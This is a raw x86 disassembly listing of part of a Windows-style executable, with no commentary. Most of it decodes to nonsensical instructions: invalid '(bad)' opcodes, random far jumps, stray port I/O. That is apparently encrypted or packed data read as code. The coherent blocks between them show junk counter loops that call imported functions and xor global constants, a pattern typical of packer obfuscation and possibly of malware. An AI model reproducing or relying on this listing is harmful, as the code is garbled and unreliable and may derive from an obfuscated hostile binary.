  40b71b:	add    esp,ebx
  40b71d:	outs   dx,BYTE PTR ds:[esi]
  40b71e:	jmp    DWORD PTR [ecx-0x3ba81a2b]
  40b724:	mov    ebx,0x92e4418a
  40b729:	popa   
  40b72a:	int3   
  40b72b:	sub    eax,0x2f652ed9
  40b730:	jbe    0x40b719
  40b732:	loopne 0x40b6bf
  40b734:	in     ax,dx
  40b736:	or     bl,BYTE PTR [ecx-0x1]
  40b739:	(bad)  
  40b73a:	adc    al,0x80
  40b73c:	(bad)  
  40b73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b73f:	not    DWORD PTR [eax]
  40b741:	in     al,dx
  40b742:	jmp    0xbc08a3f8
  40b747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b748:	mov    ch,0x35
  40b74a:	jnp    0x40b751
  40b74c:	mov    ds:0xf9597c5c,eax
  40b751:	fistp  DWORD PTR [ecx-0x56]
  40b754:	push   ebp
  40b755:	sbb    BYTE PTR ds:0xfabb4939,bh
  40b75b:	stos   BYTE PTR es:[edi],al
  40b75c:	push   edx
  40b75d:	scas   al,BYTE PTR es:[edi]
  40b75e:	adc    bh,BYTE PTR [esi-0x18f2ff24]
  40b764:	sub    ch,al
  40b766:	fld    DWORD PTR [ecx+ebp*4-0x6946b6ce]
  40b76d:	stc    
  40b76e:	das    
  40b76f:	sahf   
  40b770:	dec    ebp
  40b771:	std    
  40b772:	scas   al,BYTE PTR es:[edi]
  40b773:	mov    DWORD PTR [edi-0x437e9614],0x14ca4485
  40b77d:	rol    dh,1
  40b77f:	pop    ecx
  40b780:	and    esi,DWORD PTR [edi-0x4ca9927e]
  40b786:	pop    ebp
  40b787:	lods   al,BYTE PTR ds:[esi]
  40b788:	sbb    ch,BYTE PTR [edx-0x77]
  40b78b:	jne    0x40b765
  40b78d:	and    DWORD PTR ds:0x4305b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430642
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0xe71b7797
  40b7b0:	dec    edx
  40b7b1:	jge    0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b75a
  40b7ba:	sub    eax,0x6d812e3b
  40b7bf:	sub    dl,ah
  40b7c1:	jbe    0x40b817
  40b7c3:	inc    ebp
  40b7c4:	mov    eax,ds:0xccc5ef17
  40b7c9:	mov    ch,0x71
  40b7cb:	fwait
  40b7cc:	scas   eax,DWORD PTR es:[edi]
  40b7cd:	jecxz  0x40b7eb
  40b7cf:	sub    DWORD PTR [ecx+0x3cfb30cd],0xc34f70b9
  40b7d9:	add    DWORD PTR [edx+0x35],ebp
  40b7dc:	and    edx,DWORD PTR [edi]
  40b7de:	inc    esp
  40b7df:	je     0x40b7c3
  40b7e1:	jecxz  0x40b85e
  40b7e3:	mov    BYTE PTR [edx+eax*4],al
  40b7e6:	in     eax,0x29
  40b7e8:	push   esp
  40b7e9:	fbld   TBYTE PTR [edi]
  40b7eb:	cmc    
  40b7ec:	dec    ebp
  40b7ed:	not    BYTE PTR [edx-0x5dd7044f]
  40b7f3:	and    eax,0x31c2aa7d
  40b7f8:	jmp    0xa37b:0xa1b4529a
  40b7ff:	pop    ecx
  40b800:	dec    ebp
  40b801:	mov    edi,0x4440b6e2
  40b806:	out    dx,al
  40b807:	inc    eax
  40b808:	(bad)  
  40b809:	and    DWORD PTR [ebp+0x268f86e4],esp
  40b80f:	mov    ebx,0xfea9866f
  40b814:	(bad)  
  40b815:	or     al,0x8b
  40b817:	mov    dh,0x78
  40b819:	mov    esi,0x5180fd9d
  40b81e:	pushf  
  40b81f:	clc    
  40b820:	and    ebp,esi
  40b822:	pop    ebp
  40b823:	sub    DWORD PTR [ebp-0x30],0x10ddcbf4
  40b82a:	xor    ch,cl
  40b82c:	addr16 inc edi
  40b82e:	daa    
  40b82f:	mov    ch,0x20
  40b831:	inc    ebp
  40b832:	mov    eax,DWORD PTR [ecx+0x2a]
  40b835:	mov    eax,0x22bd389b
  40b83a:	jge    0x40b85b
  40b83c:	and    BYTE PTR [ebp+0x36fc8e89],ch
  40b842:	mov    ds:0x4d4e905f,al
  40b847:	cwde   
  40b848:	ss mov ch,0xcb
  40b84b:	lock mov edi,0x4e0389cc
  40b851:	xchg   esp,eax
  40b852:	xor    esp,DWORD PTR [esp+esi*4]
  40b855:	into   
  40b856:	push   eax
  40b857:	leave  
  40b858:	jle    0x40b813
  40b85a:	push   ecx
  40b85b:	imul   eax,ecx,0x6d
  40b85e:	xor    BYTE PTR [esp+eiz*2-0x5f],bh
  40b862:	add    DWORD PTR [esi],0xffffffbe
  40b865:	xor    dl,BYTE PTR [ebx-0x4022c905]
  40b86b:	sub    eax,DWORD PTR [ebp+0x43]
  40b86e:	sub    BYTE PTR [esi-0x2d16713e],bh
  40b874:	(bad)  
  40b876:	out    0x63,eax
  40b878:	push   ecx
  40b879:	(bad)  
  40b87a:	aam    0x54
  40b87c:	dec    DWORD PTR [esi-0x16714da6]
  40b882:	outs   dx,DWORD PTR ds:[esi]
  40b883:	daa    
  40b884:	retf   0x14c6
  40b887:	add    eax,0x92eb7a5b
  40b88c:	mov    ah,0xe9
  40b88e:	retf   0x5496
  40b891:	fsubr  st(3),st
  40b893:	(bad)  
  40b894:	xlat   BYTE PTR ds:[ebx]
  40b895:	les    ebp,FWORD PTR [ebx+0x454fcef3]
  40b89b:	sub    al,0x88
  40b89d:	ret    0x4657
  40b8a0:	lock jmp 0x24fe:0xe870b7c9
  40b8a8:	fmul   QWORD PTR [esi-0x62]
  40b8ab:	jb     0x40b921
  40b8ad:	js     0x40b897
  40b8af:	xchg   edi,eax
  40b8b0:	call   FWORD PTR [ebx+eiz*1-0x2e]
  40b8b4:	sub    cl,ch
  40b8b6:	fcom   QWORD PTR [edx]
  40b8b8:	dec    ebx
  40b8b9:	cld    
  40b8ba:	pop    esp
  40b8bb:	pusha  
  40b8bc:	pop    edx
  40b8bd:	sbb    DWORD PTR [eax],0x94147c6d
  40b8c3:	ins    DWORD PTR es:[edi],dx
  40b8c4:	das    
  40b8c5:	fisttp DWORD PTR ds:0x56cb0196
  40b8cb:	or     BYTE PTR [ecx],ah
  40b8cd:	add    eax,0x1d05980e
  40b8d2:	call   0xe78a:0x7cacdc0b
  40b8d9:	pop    eax
  40b8da:	mov    bh,0x10
  40b8dc:	mov    bl,0x14
  40b8de:	ins    DWORD PTR es:[edi],dx
  40b8df:	ret    
  40b8e0:	add    al,0x9a
  40b8e2:	xchg   esp,eax
  40b8e3:	cwde   
  40b8e4:	jb     0x40b874
  40b8e6:	mov    eax,ds:0xbf9d0e6
  40b8eb:	ins    DWORD PTR es:[edi],dx
  40b8ec:	add    BYTE PTR [edx-0x49],0x59
  40b8f0:	mov    al,ds:0xd9092526
  40b8f5:	jae    0x40b8f9
  40b8f7:	int3   
  40b8f8:	dec    BYTE PTR [esi+0x1bec7589]
  40b8fe:	or     eax,0x430646
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430596
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43059e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4305a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ef28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ef2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ef20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	sbb    BYTE PTR [edi-0x2d],0x57
  40b963:	push   ebx
  40b964:	ds clc 
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b927
  40b96d:	ficom  DWORD PTR [edi]
  40b96f:	scas   eax,DWORD PTR es:[edi]
  40b970:	dec    ebp
  40b971:	jbe    0x40b937
  40b973:	mov    ebp,0x214b309e
  40b978:	adc    al,0xbb
  40b97a:	dec    esp
  40b97b:	fs aaa 
  40b97d:	addr16 stc 
  40b97f:	call   0xa390:0x4b27868f
  40b986:	pop    edi
  40b987:	js     0x40b931
  40b989:	mov    eax,ds:0x26e7ad4f
  40b98e:	lahf   
  40b98f:	pop    ecx
  40b990:	adc    bl,BYTE PTR [eax+edi*1-0x28ad2e0d]
  40b997:	(bad)  
  40b998:	jl     0x40b976
  40b99a:	in     al,0x32
  40b99c:	mov    ds:0xe6d36e12,eax
  40b9a1:	out    dx,al
  40b9a2:	sbb    edi,DWORD PTR [eax+edx*8]
  40b9a5:	mov    BYTE PTR [edi-0xc36fa52],0xe8
  40b9ac:	adc    BYTE PTR [edi+esi*2+0x30a213cb],ah
  40b9b3:	xchg   esi,eax
  40b9b4:	lods   eax,DWORD PTR ds:[esi]
  40b9b5:	xor    eax,0x4c8f115a
  40b9ba:	cmp    al,0xbe
  40b9bc:	fidiv  DWORD PTR [edx-0x6747ff04]
  40b9c2:	aad    0x34
  40b9c4:	mov    eax,ds:0x1154559c
  40b9c9:	push   eax
  40b9ca:	loopne 0x40b97f
  40b9cc:	jae    0x40b9c2
  40b9ce:	jp     0x40b9b5
  40b9d0:	xor    ch,BYTE PTR [ebp-0xa]
  40b9d3:	inc    eax
  40b9d4:	and    DWORD PTR [esi+0x62],ebx
  40b9d7:	push   ebp
  40b9d8:	ret    0xe656
  40b9db:	ret    
  40b9dc:	fstp   TBYTE PTR [edx-0x43]
  40b9df:	jae    0x40ba15
  40b9e1:	enter  0xf14c,0xbb
  40b9e5:	hlt    
  40b9e6:	xor    al,0x8c
  40b9e8:	add    ah,dh
  40b9ea:	fcomip st,st(2)
  40b9ec:	fwait
  40b9ed:	sti    
  40b9ee:	(bad)  
  40b9ef:	pop    ecx
  40b9f0:	inc    edx
  40b9f1:	fisttp DWORD PTR [ebx-0x3b]
  40b9f4:	stos   DWORD PTR es:[edi],eax
  40b9f5:	push   edi
  40b9f6:	data16 (bad) 
  40b9f9:	dec    ebp
  40b9fa:	mov    eax,ds:0xf6a33f61
  40b9ff:	xor    eax,0xcb24bfe5
  40ba04:	add    eax,0x6a2ab7a3
  40ba09:	in     al,dx
  40ba0a:	call   0xf442:0xe8fc99b2
  40ba11:	push   edi
  40ba12:	ins    DWORD PTR es:[edi],dx
  40ba13:	nop
  40ba14:	xor    eax,0xfc9e3efd
  40ba19:	xor    edi,DWORD PTR [edx]
  40ba1b:	(bad)  
  40ba1c:	pop    ecx
  40ba1d:	sbb    BYTE PTR [edx*8-0x28e76b5f],ah
  40ba24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba25:	pop    edi
  40ba26:	push   cs
  40ba27:	pushf  
  40ba28:	scas   eax,DWORD PTR es:[edi]
  40ba29:	bound  ecx,QWORD PTR ds:0xec632da1
  40ba2f:	scas   al,BYTE PTR es:[edi]
  40ba30:	ja     0x40ba86
  40ba32:	enter  0x5e09,0xab
  40ba36:	jmp    0x5056:0x7e7b53a5
  40ba3d:	add    bh,bh
  40ba3f:	icebp  
  40ba40:	fnstsw ax
  40ba42:	push   esi
  40ba43:	in     eax,dx
  40ba44:	jae    0x40baa3
  40ba46:	jmp    0x40ba1c
  40ba48:	ror    DWORD PTR [edx-0x7acba324],1
  40ba4e:	cmp    al,0x22
  40ba50:	stos   DWORD PTR es:[edi],eax
  40ba51:	inc    esp
  40ba52:	int    0xa8
  40ba54:	sbb    BYTE PTR [ebp-0x24],bh
  40ba57:	imul   ebp,esp,0xd640044e
  40ba5d:	out    0x5d,eax
  40ba5f:	mov    ?,WORD PTR [ecx+0x5b]
  40ba62:	fwait
  40ba63:	cmp    dh,ah
  40ba65:	mov    ds:0x77566246,al
  40ba6a:	pop    ebp
  40ba6b:	jg     0x40ba56
  40ba6d:	adc    DWORD PTR [edi+ebp*8],ebx
  40ba70:	push   ebp
  40ba71:	dec    edx
  40ba72:	les    edi,FWORD PTR [edx-0x540d3bad]
  40ba78:	mov    WORD PTR [eax],cs
  40ba7a:	jmp    0x91d79029
  40ba7f:	dec    eax
  40ba80:	sub    ah,BYTE PTR [esi+0x2f]
  40ba83:	rcl    ecx,cl
  40ba85:	dec    edx
  40ba86:	dec    BYTE PTR [edi]
  40ba88:	(bad)  
  40ba89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba8a:	lds    esp,FWORD PTR [ecx+0x13a86967]
  40ba90:	adc    ebx,DWORD PTR [edi+0x1c7378c4]
  40ba96:	(bad)  
  40ba97:	cmp    edi,ebx
  40ba99:	(bad)  
  40ba9a:	and    al,BYTE PTR [eax]
  40ba9c:	rcl    cl,cl
  40ba9e:	push   0xffffffde
  40baa0:	xchg   ebx,eax
  40baa1:	xor    DWORD PTR [esi+0x71],esi
  40baa4:	adc    edi,DWORD PTR [esi]
  40baa6:	leave  
  40baa7:	fwait
  40baa8:	call   0x666ef6f
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ef20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430596,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ef28,0x42ef14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ef1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ef1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ef1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ef1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ecd4
  40bb1b:	cmp    DWORD PTR ds:0x42ef1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430656
  40bb2e:	xor    DWORD PTR ds:0x4305b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4305b2,0x43059a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	adc    bl,ch
  40bb58:	cld    
  40bb59:	add    edi,edi
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb54
  40bb63:	or     bl,BYTE PTR [edi+0x14]
  40bb66:	mov    edx,0xd56cfc34
  40bb6b:	adc    eax,edi
  40bb6d:	mov    ebx,0x56be5ee1
  40bb72:	pop    ecx
  40bb73:	mov    db5,esi
  40bb76:	(bad)  
  40bb77:	leave  
  40bb78:	sub    edx,ebp
  40bb7a:	mov    edi,0x9f04fbbe
  40bb7f:	sbb    cl,al
  40bb81:	sbb    bh,cl
  40bb83:	enter  0x77df,0x72
  40bb87:	mov    cl,0xc9
  40bb89:	(bad)  
  40bb8b:	xchg   edx,eax
  40bb8c:	dec    ecx
  40bb8d:	cld    
  40bb8e:	and    al,0x89
  40bb90:	sbb    BYTE PTR [edx],0x9
  40bb93:	mov    edx,DWORD PTR [ecx]
  40bb95:	push   ss
  40bb96:	sbb    BYTE PTR [ebx],cl
  40bb98:	test   BYTE PTR [edx+0x6d4f1055],dh
  40bb9e:	dec    edi
  40bb9f:	pop    ds
  40bba0:	add    eax,DWORD PTR [eax-0x19a7e4a4]
  40bba6:	mov    bh,0xc5
  40bba8:	inc    ebx
  40bba9:	sub    bl,cl
  40bbab:	loop   0x40bb3f
  40bbad:	xchg   BYTE PTR [edi],cl
  40bbaf:	adc    eax,0x624743e
  40bbb4:	out    dx,al
  40bbb5:	or     eax,0xa7b6693b
  40bbba:	or     BYTE PTR [ebp+0x1dc6164b],dl
  40bbc0:	mov    edi,0xc38eca6d
  40bbc5:	ret    0x2b33
  40bbc8:	xlat   BYTE PTR ds:[ebx]
  40bbc9:	mov    ah,0x6
  40bbcb:	inc    edx
  40bbcc:	xchg   esi,eax
  40bbcd:	imul   eax,eax,0x49
  40bbd0:	iret   
  40bbd1:	and    dl,ch
  40bbd3:	fcomi  st,st(5)
  40bbd5:	sub    eax,0x11976a62
  40bbda:	in     al,dx
  40bbdb:	or     al,0xb
  40bbdd:	mov    ds:0x1f18a7d2,al
  40bbe2:	xchg   ebx,eax
  40bbe3:	icebp  
  40bbe4:	mov    dh,0xc0
  40bbe6:	adc    edi,DWORD PTR [ebx-0x29]
  40bbe9:	dec    esp
  40bbea:	stc    
  40bbeb:	pop    eax
  40bbec:	std    
  40bbed:	and    al,0xf2
  40bbef:	outs   dx,DWORD PTR ds:[esi]
  40bbf0:	mov    cl,0xa7
  40bbf2:	(bad)  
  40bbf3:	push   edx
  40bbf4:	sub    BYTE PTR [edx+0x1a],ah
  40bbf7:	lods   eax,DWORD PTR ds:[esi]
  40bbf8:	mov    WORD PTR ds:0x61256a47,?
  40bbfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbff:	and    al,ah
  40bc01:	ds das 
  40bc03:	enter  0xf749,0x9b
  40bc07:	cmp    DWORD PTR [edi],ebp
  40bc09:	(bad)  
  40bc0b:	out    dx,eax
  40bc0c:	test   eax,0x784e18bc
  40bc11:	xor    ebp,ebp
  40bc13:	cmc    
  40bc14:	mov    WORD PTR [eax],gs
  40bc16:	fcmovbe st,st(2)
  40bc18:	(bad)  
  40bc1a:	xor    DWORD PTR [edi+0x75],esp
  40bc1d:	adc    eax,0x561c8dc6
  40bc22:	push   edx
  40bc23:	sbb    BYTE PTR [ecx],ah
  40bc25:	jl     0x40bc88
  40bc27:	pop    ebx
  40bc28:	nop
  40bc29:	ja     0x40bc31
  40bc2b:	jns    0x40bc4f
  40bc2d:	sub    BYTE PTR [esp+ecx*2+0x2e1431d4],cl
  40bc34:	lahf   
  40bc35:	mov    eax,ds:0xa0fb4774
  40bc3a:	or     ebx,ebp
  40bc3c:	clc    
  40bc3d:	pop    esp
  40bc3e:	scas   al,BYTE PTR es:[edi]
  40bc3f:	mov    edx,0x7ae2b0b5
  40bc44:	cmc    
  40bc45:	sub    al,0x42
  40bc47:	addr16 pop ebx
  40bc49:	pop    ds
  40bc4a:	jo     0x40bca9
  40bc4c:	outs   dx,BYTE PTR ds:[esi]
  40bc4d:	iret   
  40bc4e:	pop    ebp
  40bc4f:	imul   ecx,DWORD PTR [esp+ebp*4],0x52f41283
  40bc56:	or     eax,0x960dadbe
  40bc5b:	sbb    DWORD PTR [esp+edi*2+0x5c],0xaae4af22
  40bc63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc64:	xlat   BYTE PTR ds:[ebx]
  40bc65:	mov    WORD PTR [edx+eiz*8+0x46bcec7a],fs
  40bc6c:	pop    esp
  40bc6d:	xlat   BYTE PTR ds:[ebx]
  40bc6e:	mov    gs,WORD PTR [edx+0x25820dd]
  40bc74:	shl    BYTE PTR [ebp-0x76],0xd3
  40bc78:	push   eax
  40bc79:	dec    ecx
  40bc7a:	cmp    eax,0x9aaf71d2
  40bc7f:	pusha  
  40bc80:	ret    
  40bc81:	mov    al,ds:0xc0452898
  40bc86:	in     eax,0xb3
  40bc88:	pop    edi
  40bc89:	sbb    dl,BYTE PTR [esi+0x78]
  40bc8c:	icebp  
  40bc8d:	cmp    bh,bh
  40bc8f:	inc    esp
  40bc90:	clc    
  40bc91:	mov    DWORD PTR [edi+0x977fbbc],esi
  40bc97:	aad    0x91
  40bc99:	push   edi
  40bc9a:	lea    eax,[ecx]
  40bc9c:	inc    esp
  40bc9d:	(bad)  
  40bc9e:	fnstenv [esi+0x327d697]
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430652,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43064e,0x42ef30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4305be,0x430646
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4305c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4305c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4305c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4305c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4305c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4305a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42eb2c
  40bd1f:	cmp    DWORD PTR ds:0x4305c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4305c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4305c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e872,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430596
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43065a,0x430652
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ef10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4305b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4305b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4305b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42eb30
  40bdad:	mov    ecx,DWORD PTR ds:0x4305b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4305b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43065a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	aam    0xa0
  40bdde:	(bad)  
  40bddf:	jle    0x40bd91
  40bde1:	cli    
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bd75
  40bde9:	(bad)  
  40bdea:	imul   eax,DWORD PTR ds:0xc7cab16f,0x94af8f61
  40bdf4:	out    0x63,al
  40bdf6:	repnz pushf 
  40bdf8:	sub    BYTE PTR [ebp+ecx*2-0x5e5ef777],ch
  40bdff:	push   esp
  40be00:	je     0x40be07
  40be02:	stc    
  40be03:	mov    eax,0x10369658
  40be08:	cmp    bh,dh
  40be0a:	inc    ebx
  40be0b:	sub    BYTE PTR [eax+0x61763697],0x40
  40be12:	push   es
  40be13:	retf   
  40be14:	fs scas ax,WORD PTR es:[edi]
  40be17:	pop    esi
  40be18:	jnp    0x40be99
  40be1a:	pop    eax
  40be1b:	xor    eax,0x615820b0
  40be20:	sbb    eax,0x812e900a
  40be25:	iret   
  40be26:	scas   al,BYTE PTR es:[edi]
  40be27:	call   0x7347:0x8f44fcaa
  40be2e:	and    ch,BYTE PTR [eax]
  40be30:	adc    eax,0xacdc645b
  40be35:	xchg   eax,eax
  40be37:	ret    0xf9c9
  40be3a:	iret   
  40be3b:	sub    DWORD PTR [edx-0x7d],edi
  40be3e:	bound  eax,QWORD PTR [esi+0x57]
  40be41:	xchg   BYTE PTR [ebp+ecx*8-0xe],ch
  40be45:	mov    esp,0xf2266883
  40be4a:	cwde   
  40be4b:	sar    dh,1
  40be4d:	xchg   BYTE PTR ds:0x95964351,bl
  40be53:	outs   dx,BYTE PTR ds:[esi]
  40be54:	xchg   ebp,eax
  40be55:	in     eax,0x3b
  40be57:	xor    al,0x3f
  40be59:	les    edi,FWORD PTR [ebp-0x71161d78]
  40be5f:	xor    BYTE PTR ds:0xe619a6c7,dh
  40be65:	das    
  40be66:	dec    edx
  40be67:	xchg   ebp,eax
  40be68:	sar    BYTE PTR [eax],0x6d
  40be6b:	lods   eax,DWORD PTR ds:[esi]
  40be6c:	fmul   DWORD PTR [eax-0x74501b7d]
  40be72:	lods   al,BYTE PTR ds:[esi]
  40be73:	inc    eax
  40be74:	mov    esi,0x3c7c835c
  40be79:	adc    al,0x43
  40be7b:	jno    0x40be7b
  40be7d:	outs   dx,BYTE PTR ds:[esi]
  40be7e:	push   0xffffffe7
  40be80:	dec    esp
  40be81:	sbb    BYTE PTR [edx],0xfc
  40be84:	aas    
  40be85:	ficom  WORD PTR [ebx-0x6a06baa3]
  40be8b:	xchg   esp,eax
  40be8c:	push   ss
  40be8d:	popf   
  40be8e:	sbb    al,0xd4
  40be90:	mov    dh,0x35
  40be92:	and    al,0x31
  40be94:	iret   
  40be95:	pop    edx
  40be96:	jae    0x40bec7
  40be98:	mov    dh,0x3
  40be9a:	sbb    DWORD PTR [ebx+0x4ff23e86],edx
  40bea0:	addr16 jo 0x40bf00
  40bea3:	adc    eax,0x986ebeb
  40bea8:	push   ds
  40bea9:	js     0x40bf12
  40beab:	in     al,dx
  40beac:	cmp    al,0x1f
  40beae:	and    eax,esi
  40beb0:	xchg   esp,eax
  40beb1:	mov    ch,0x1f
  40beb3:	pop    es
  40beb4:	in     eax,dx
  40beb5:	call   0x8961:0x5dd33f2
  40bebc:	sahf   
  40bebd:	popa   
  40bebe:	fmulp  st(5),st
  40bec0:	setg   BYTE PTR [ecx-0x375733a4]
  40bec7:	push   eax
  40bec8:	(bad)  
  40bec9:	shl    BYTE PTR [ecx+0x5498955c],0xfa
  40bed0:	inc    edx
  40bed1:	mov    ch,0x20
  40bed3:	push   0xa6eae20a
  40bed8:	(bad)  
  40beda:	jl     0x40bf30
  40bedc:	add    ebx,DWORD PTR [edi+0x778a0334]
  40bee2:	retf   0x43e3
  40bee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee6:	repz mov eax,0xb7725175
  40beec:	sub    ah,BYTE PTR [esi+0xd]
  40beef:	fs call 0x83e3:0x255c0b42
  40bef7:	add    al,0x6f
  40bef9:	pusha  
  40befa:	jb     0x40beb4
  40befc:	ins    DWORD PTR es:[edi],dx
  40befd:	sub    edx,DWORD PTR [esi]
  40beff:	loope  0x40bf58
  40bf01:	add    al,0x8c
  40bf03:	push   ds
  40bf04:	jmp    0x40becf
  40bf06:	fldenv [esi-0x61]
  40bf09:	inc    ebp
  40bf0a:	inc    eax
  40bf0b:	enter  0x75c1,0xf2
  40bf0f:	inc    ebp
  40bf10:	ins    BYTE PTR es:[edi],dx
  40bf11:	mov    al,0xf6
  40bf13:	out    dx,al
  40bf14:	sbb    DWORD PTR [eax],ebx
  40bf16:	mov    ecx,0x8fc27158
  40bf1b:	aam    0x18
  40bf1d:	in     eax,0x73
  40bf1f:	sahf   
  40bf20:	jno    0x40beed
  40bf22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf23:	rcr    BYTE PTR [ebx-0x2d],1
  40bf26:	jmp    FWORD PTR [edx]
  40bf28:	lahf   
  40bf29:	mov    eax,DWORD PTR [ebp-0x14]
  40bf2c:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf2f:	sbb    DWORD PTR ds:0x4305a6,0xe94
  40bf39:	jmp    0x40c097
  40bf3e:	fmul   QWORD PTR [edi+0x7d6d4fad]
  40bf44:	cld    
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	pushf  
  40bf4b:	sahf   
  40bf4c:	xchg   BYTE PTR [esi+0x7e7efc71],ch
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bfbb
  40bf57:	and    eax,0x5c1ab342
  40bf5c:	stos   DWORD PTR es:[edi],eax
  40bf5d:	add    BYTE PTR [edx],bh
  40bf5f:	lods   eax,DWORD PTR ds:[esi]
  40bf60:	cld    
  40bf61:	mov    ebx,0x69b1bdb8
